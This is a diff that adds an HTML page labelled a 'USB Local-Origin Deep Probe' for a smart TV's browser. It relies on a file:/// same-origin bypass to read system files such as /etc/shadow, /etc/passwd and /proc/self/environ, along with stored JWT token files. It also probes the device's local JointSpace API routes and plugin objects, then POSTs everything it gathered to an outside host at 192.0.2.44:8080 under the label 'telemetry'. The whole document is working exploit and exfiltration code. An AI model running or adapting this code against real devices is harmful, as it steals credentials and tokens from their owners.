@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Titan OS USB Local-Origin Deep Probe v2</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: #0b0f19;
+            color: #c9d1d9;
+            font-family: 'Courier New', monospace;
+            padding: 24px;
+            font-size: 18px;
+        }
+        h1 { color: #2ea043; font-size: 28px; margin-bottom: 4px; }
+        .subtitle { color: #8b949e; margin-bottom: 20px; font-size: 15px; }
+        .section { color: #58a6ff; font-weight: bold; font-size: 16px; margin-top: 16px; }
+        .box {
+            background: #161b22;
+            border: 2px solid #30363d;
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 10px;
+            word-wrap: break-word;
+            max-height: 350px;
+            overflow-y: auto;
+        }
+        .highlight { color: #f0883e; }
+        .success { color: #7ee787; font-weight: bold; }
+        .alert { color: #f85149; }
+        .info { color: #58a6ff; }
+        pre { margin: 0; white-space: pre-wrap; font-size: 15px; line-height: 1.4; }
+        .progress { color: #d2a8ff; }
+    </style>
+</head>
+<body>
+    <h1>🎯 TITAN OS USB FILE-ORIGIN DEEP PROBE v2</h1>
+    <div class="subtitle">Executing from USB local filesystem (file:/// origin) — SOP bypass territory</div>
+
+    <div class="section">1. Execution Context</div>
+    <div class="box">
+        <pre id="context" class="progress">Detecting origin and mount path...</pre>
+    </div>
+
+    <div class="section">2. Critical System Files</div>
+    <div class="box">
+        <pre id="sysfiles" class="progress">Probing /proc, /etc...</pre>
+    </div>
+
+    <div class="section">3. Browser Runtime & JWT Token</div>
+    <div class="box">
+        <pre id="browser" class="progress">Probing /mnt/browser/...</pre>
+    </div>
+
+    <div class="section">4. Filesystem Layout (Init Scripts & Partitions)</div>
+    <div class="box">
+        <pre id="filesystem" class="progress">Mapping filesystem...</pre>
+    </div>
+
+    <div class="section">5. Process Identity & Capabilities</div>
+    <div class="box">
+        <pre id="process" class="progress">Probing /proc/self/...</pre>
+    </div>
+
+    <div class="section">6. JointSpace Loopback (127.0.0.1:1925)</div>
+    <div class="box">
+        <pre id="loopback" class="progress">Testing loopback routes...</pre>
+    </div>
+
+    <div class="section">7. IPC Plugin Quick Probe</div>
+    <div class="box">
+        <pre id="ipc" class="progress">Instantiating plugins...</pre>
+    </div>
+
+    <div class="section">8. Telemetry Sync</div>
+    <div class="box">
+        <pre id="sync" class="progress">Queued...</pre>
+    </div>
+
+    <!-- OIPF plugin objects -->
+    <p style="position:fixed; opacity:0; pointer-events:none;">
+        <object id="oipfAppMan" type="application/oipfApplicationManager"></object>
+        <object id="oipfConfig" type="application/oipfConfiguration"></object>
+        <object id="ipc_primary" type="application/browser-ipc-2"></object>
+    </p>
+
+    <script>
+        var HOST = 'http://192.0.2.44:8080';
+        var telemetry = {
+            harness: 'debug_usb_v2',
+            version: '2.0.0',
+            timestamp: new Date().toISOString(),
+            executionOrigin: 'USB_LOCAL_FILE',
+            href: window.location.href,
+            protocol: window.location.protocol,
+            userAgent: navigator.userAgent,
+            viewport: {
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                devicePixelRatio: window.devicePixelRatio || 1
+            },
+            systemFiles: {},
+            browserFiles: {},
+            filesystemLayout: {},
+            processInfo: {},
+            loopbackProbes: {},
+            ipcQuickProbe: {},
+            oipf: {},
+            errors: []
+        };
+
+        // 1. Execution context
+        document.getElementById('context').innerText =
+            'Origin:   ' + window.location.href + '\n' +
+            'Protocol: ' + window.location.protocol + '\n' +
+            'UA:       ' + navigator.userAgent.substring(0, 120) + '...';
+
+        // ----------------------------------------------------------
+        // File probing engine (works only from file:/// origin)
+        // ----------------------------------------------------------
+        var pendingProbes = 0;
+        var completedSections = {};
+
+        function probeFile(url, category, uiElement) {
+            pendingProbes++;
+            var target = telemetry[category];
+
+            if (window.location.protocol !== 'file:') {
+                target[url] = 'BLOCKED: Running from ' + window.location.protocol + ' origin (need file:/// for SOP bypass)';
+                pendingProbes--;
+                updateUI(uiElement, category);
+                return;
+            }
+
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', url, true);
+                xhr.timeout = 3000;
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        if (xhr.status === 200 || (xhr.responseText && xhr.responseText.length > 0)) {
+                            target[url] = '✓ READ SUCCESS (' + xhr.responseText.length + ' bytes):\n' + xhr.responseText.substring(0, 1000);
+                        } else if (xhr.status === 0 && !xhr.responseText) {
+                            target[url] = '✗ Blocked by Chromium file:// isolation (status 0, empty response)';
+                        } else {
+                            target[url] = '? STATUS ' + xhr.status + ' (length: ' + (xhr.responseText ? xhr.responseText.length : 0) + ')';
+                        }
+                        pendingProbes--;
+                        updateUI(uiElement, category);
+                    }
+                };
+                xhr.onerror = function() {
+                    target[url] = '✗ Network error / Permission denied';
+                    pendingProbes--;
+                    updateUI(uiElement, category);
+                };
+                xhr.ontimeout = function() {
+                    target[url] = '✗ Timeout (3s)';
+                    pendingProbes--;
+                    updateUI(uiElement, category);
+                };
+                xhr.send();
+            } catch (err) {
+                target[url] = '✗ Exception: ' + err.message;
+                pendingProbes--;
+                updateUI(uiElement, category);
+            }
+        }
+
+        function updateUI(elementId, category) {
+            var el = document.getElementById(elementId);
+            if (el) {
+                var data = telemetry[category];
+                var lines = [];
+                for (var k in data) {
+                    var shortKey = k.replace('file://', '');
+                    var val = String(data[k]);
+                    if (val.indexOf('SUCCESS') >= 0) {
+                        lines.push('✓ ' + shortKey + '\n  ' + val.substring(val.indexOf(':\n') + 2, val.indexOf(':\n') + 200));
+                    } else {
+                        lines.push('  ' + shortKey + ' → ' + val.substring(0, 120));
+                    }
+                }
+                el.innerText = lines.join('\n');
+            }
+        }
+
+        // ----------------------------------------------------------
+        // 2. Critical system files
+        // ----------------------------------------------------------
+        var systemTargets = [
+            'file:///proc/version',
+            'file:///proc/cmdline',
+            'file:///proc/mounts',
+            'file:///proc/partitions',
+            'file:///proc/cpuinfo',
+            'file:///proc/meminfo',
+            'file:///proc/net/tcp',
+            'file:///proc/net/tcp6',
+            'file:///proc/modules',
+            'file:///etc/passwd',
+            'file:///etc/shadow',
+            'file:///etc/hostname',
+            'file:///etc/hosts',
+            'file:///etc/resolv.conf',
+            'file:///etc/fstab',
+            'file:///etc/os-release',
+            'file:///etc/issue'
+        ];
+        for (var i = 0; i < systemTargets.length; i++) {
+            probeFile(systemTargets[i], 'systemFiles', 'sysfiles');
+        }
+
+        // ----------------------------------------------------------
+        // 3. Browser runtime and JWT token
+        // ----------------------------------------------------------
+        var browserTargets = [
+            'file:///mnt/browser/jwt_output_1.txt',
+            'file:///mnt/browser/jwt_output_2.txt',
+            'file:///mnt/browser/config.json',
+            'file:///mnt/browser/settings.json',
+            'file:///mnt/browser/preferences',
+            'file:///tmp/jwt_output_1.txt',
+            'file:///data/browser/jwt_output_1.txt',
+            'file:///persist/browser/jwt_output_1.txt',
+            'file:///data/local/tmp/jwt_output_1.txt'
+        ];
+        for (var j = 0; j < browserTargets.length; j++) {
+            probeFile(browserTargets[j], 'browserFiles', 'browser');
+        }
+
+        // ----------------------------------------------------------
+        // 4. Filesystem layout — init scripts, startup chains
+        // ----------------------------------------------------------
+        var fsTargets = [
+            'file:///etc/init.d/rcS',
+            'file:///etc/init.d/S01logging',
+            'file:///etc/init.d/S10network',
+            'file:///etc/init.d/S20urandom',
+            'file:///etc/init.d/S40bluetooth',
+            'file:///etc/init.d/S50sshd',
+            'file:///etc/init.d/S99local',
+            'file:///etc/inittab',
+            'file:///init',
+            'file:///init.rc',
+            'file:///etc/rcS.d/S01logging',
+            'file:///etc/profile',
+            'file:///etc/iptables.rules',
+            'file:///etc/iptables/rules.v4',
+            'file:///usr/bin/bootstrap.sh',
+            'file:///usr/canary_test.txt',
+            'file:///data/canary_test.txt'
+        ];
+        for (var k = 0; k < fsTargets.length; k++) {
+            probeFile(fsTargets[k], 'filesystemLayout', 'filesystem');
+        }
+
+        // ----------------------------------------------------------
+        // 5. Process identity and capability probes
+        // ----------------------------------------------------------
+        var processTargets = [
+            'file:///proc/self/status',
+            'file:///proc/self/maps',
+            'file:///proc/self/cmdline',
+            'file:///proc/self/cgroup',
+            'file:///proc/self/environ',
+            'file:///proc/self/limits',
+            'file:///proc/self/mountinfo',
+            'file:///proc/self/exe',
+            'file:///proc/1/cmdline',
+            'file:///proc/1/status'
+        ];
+        for (var m = 0; m < processTargets.length; m++) {
+            probeFile(processTargets[m], 'processInfo', 'process');
+        }
+
+        // ----------------------------------------------------------
+        // 6. JointSpace loopback probes (with auth attempt)
+        // ----------------------------------------------------------
+        function probeLoopback() {
+            if (!window.fetch) {
+                document.getElementById('loopback').innerText = '⊘ fetch() API not available';
+                return;
+            }
+
+            var routes = [
+                { path: '/1/system', desc: 'JointSpace v1 system info' },
+                { path: '/6/system', desc: 'JointSpace v6 system info (tvtype check)' },
+                { path: '/6/debug', desc: 'Debug endpoint (403 on consumer?)' },
+                { path: '/6/devtools', desc: 'DevTools activation' },
+                { path: '/6/diagnostics', desc: 'Diagnostics' },
+                { path: '/6/applications', desc: 'Running applications list' },
+                { path: '/6/directfb', desc: 'DirectFB framebuffer access' },
+                { path: '/6/activities/browser', desc: 'Browser activity launcher' },
+                { path: '/6/system/storage', desc: 'USB mount status' },
+                { path: '/6/system/epgsource', desc: 'EPG source info' },
+                { path: '/6/ambilight/mode', desc: 'Ambilight mode' },
+                { path: '/6/ambilight/topology', desc: 'Ambilight LED topology' },
+                { path: '/6/audio/volume', desc: 'Volume level' },
+                { path: '/6/sources/current', desc: 'Current input source' },
+                { path: '/6/channeldb/tv/channelLists/all', desc: 'Channel database' },
+                { path: '/6/menuitems/settings/structure', desc: 'Settings menu structure' },
+                { path: '/6/notifychange', desc: 'Change notification endpoint' }
+            ];
+
+            var loopbackResults = {};
+            var completed = 0;
+
+            for (var r = 0; r < routes.length; r++) {
+                (function(route) {
+                    fetch('http://127.0.0.1:1925' + route.path, { mode: 'cors' })
+                        .then(function(resp) {
+                            return resp.text().then(function(body) {
+                                loopbackResults[route.path] = {
+                                    status: resp.status,
+                                    statusText: resp.statusText,
+                                    desc: route.desc,
+                                    body: body.substring(0, 500)
+                                };
+                                completed++;
+                                updateLoopbackUI();
+                            });
+                        })
+                        .catch(function(err) {
+                            // Retry with no-cors if CORS fails
+                            fetch('http://127.0.0.1:1925' + route.path, { mode: 'no-cors' })
+                                .then(function() {
+                                    loopbackResults[route.path] = {
+                                        status: 'opaque',
+                                        desc: route.desc,
+                                        note: 'Responded (opaque, CORS blocked body)'
+                                    };
+                                    completed++;
+                                    updateLoopbackUI();
+                                })
+                                .catch(function(err2) {
+                                    loopbackResults[route.path] = {
+                                        status: 'failed',
+                                        desc: route.desc,
+                                        error: err2.message || err.message
+                                    };
+                                    completed++;
+                                    updateLoopbackUI();
+                                });
+                        });
+                })(routes[r]);
+            }
+
+            function updateLoopbackUI() {
+                telemetry.loopbackProbes = loopbackResults;
+                var lines = [];
+                for (var path in loopbackResults) {
+                    var r = loopbackResults[path];
+                    var status = r.status;
+                    var prefix = (status === 200) ? '✓' : (status === 403) ? '🔒' : '  ';
+                    lines.push(prefix + ' ' + path + ' → HTTP ' + status + ' (' + r.desc + ')');
+                    if (r.body && r.body.length > 0 && status === 200) {
+                        lines.push('    ' + r.body.substring(0, 150));
+                    }
+                }
+                document.getElementById('loopback').innerText = lines.join('\n') + '\n\n(' + completed + '/' + routes.length + ' complete)';
+            }
+        }
+        probeLoopback();
+
+        // ----------------------------------------------------------
+        // 7. Quick IPC plugin probe
+        // ----------------------------------------------------------
+        function quickIpcProbe() {
+            var ipc = document.getElementById('ipc_primary');
+            var result = {};
+
+            if (!ipc) {
+                result.status = 'Plugin element not found';
+            } else {
+                var standardKeys = {};
+                var tempObj = document.createElement('object');
+                for (var sk in tempObj) { standardKeys[sk] = true; }
+
+                var extraKeys = [];
+                for (var k in ipc) {
+                    if (!standardKeys[k]) extraKeys.push(k);
+                }
+                result.extraKeys = extraKeys;
+                result.active = extraKeys.length > 0;
+
+                if (result.active) {
+                    result.methods = {};
+                    result.properties = {};
+                    for (var e = 0; e < extraKeys.length; e++) {
+                        try {
+                            if (typeof ipc[extraKeys[e]] === 'function') {
+                                result.methods[extraKeys[e]] = ipc[extraKeys[e]].length;
+                            } else {
+                                result.properties[extraKeys[e]] = String(ipc[extraKeys[e]]).substring(0, 200);
+                            }
+                        } catch (err) {}
+                    }
+                }
+            }
+
+            // Also check OIPF plugins
+            try {
+                var appMan = document.getElementById('oipfAppMan');
+                if (appMan) {
+                    var ak = [];
+                    for (var a in appMan) { ak.push(a); }
+                    result.oipfAppManager = ak.length + ' keys';
+                }
+            } catch (e) {}
+
+            telemetry.ipcQuickProbe = result;
+            document.getElementById('ipc').innerText = JSON.stringify(result, null, 2);
+        }
+        quickIpcProbe();
+
+        // ----------------------------------------------------------
+        // 8. Transmit telemetry
+        // ----------------------------------------------------------
+        setTimeout(function() {
+            document.getElementById('sync').innerText = '📡 Transmitting to ' + HOST + '/api/telemetry ...';
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', HOST + '/api/telemetry', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.timeout = 10000;
+                xhr.onload = function() {
+                    document.getElementById('sync').innerText = '✓ Telemetry transmitted!\n  Status: HTTP ' + xhr.status + '\n  Payload: ' + JSON.stringify(telemetry).length + ' bytes';
+                    document.getElementById('sync').className = 'success';
+                };
+                xhr.onerror = function() {
+                    document.getElementById('sync').innerText = '⚠ Workstation unreachable at ' + HOST;
+                    document.getElementById('sync').className = 'alert';
+                };
+                xhr.send(JSON.stringify(telemetry, null, 2));
+            } catch (e) {
+                document.getElementById('sync').innerText = '⚠ Error: ' + e.message;
+            }
+
+            try { console.log('[USB_PROBE_V2]', JSON.stringify(telemetry, null, 2)); } catch (e) {}
+        }, 5000);
+    </script>
+</body>
+</html>
